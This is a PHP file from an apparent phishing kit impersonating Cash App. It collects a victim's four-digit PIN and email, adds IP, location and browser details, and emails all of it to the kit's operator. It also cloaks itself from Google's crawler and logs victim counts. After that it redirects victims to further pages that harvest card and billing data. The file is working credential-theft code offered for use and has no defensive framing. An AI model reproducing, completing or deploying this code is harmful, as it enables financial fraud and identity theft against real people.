<?php
ini_set( "display_errors", 0); 


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

session_start();



if(isset($_SESSION['ssn'])) {
    echo "<script>window.location = 'https://www.cash.app';</script>";
    exit();
}

if(isset($_SESSION['oauth'])) {
    echo "<script>window.location = '{$_SESSION['redirect']}';</script>";
    exit();
}

if(isset($_POST['submit'])) {
    
    $email    = $_SESSION['email'];
    $password = $_SESSION['password'];

}


session_start();

error_reporting(0);
session_start();
require_once '../../main.php';

$_SESSION['email'];
$mail = $_SESSION['email'];
$pin1 = $_POST['pin1'];
$pin2 = $_POST['pin2'];
$pin3 = $_POST['pin3'];
$pin4 = $_POST['pin4'];
$message   = "

#------------------[ G-SPOT. Inc ]------------------------#
#--------------------[ PIN INFO ]-------------------------#

Email     :   ".$mail."
PIN       :   ".$pin1."".$pin2."".$pin3."".$pin4."

#------------------------[ DEVICE INFORMATION ]-----------------------#

IP Address  : ".$ip."
ISP		    : ".$ispuser."
Region		: ".$regionuser."
City		: ".$cityuser."
GMT         : ".$continent."
Timezone	: ".$timezone."
OS/Browser	: ".$os." / ".$br."
Date		: ".$date."
User Agent	: ".$user_agent."

#-----------------------[ きみ の こと が すき だから ]--------------------------#




";

$from = $senderemail;
$headers = "From: $sendername <$from>";
$subject = "PIN - ".$mail." - [ ".$ip." - ".$cn." - ".$os." ]";
mail($email, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r")); 

$file1 = "../../result/total_login.txt";
$isi1  = @file_get_contents($file1);
$buka1 = fopen($file1,"w"); 
fwrite($buka1, $isi1+1);
fclose($buka1);

$file = "../../result/total_pin.txt";
$isi  = @file_get_contents($file);
$buka = fopen($file,"w"); 
fwrite($buka, $isi+1);
fclose($buka);


if($setting['with_address'] == "YUPS"){
    echo "<script type='text/javascript'>window.top.location='../card/?account=$key';</script>";
   }if($setting['with_address'] == "normal"){
   echo "<script type='text/javascript'>window.top.location='../billing/?account=$key';</script>";
   }if($setting['with_address'] == "hanyacc"){
   echo "<script type='text/javascript'>window.top.location='../login/?account$key';</script>";
   }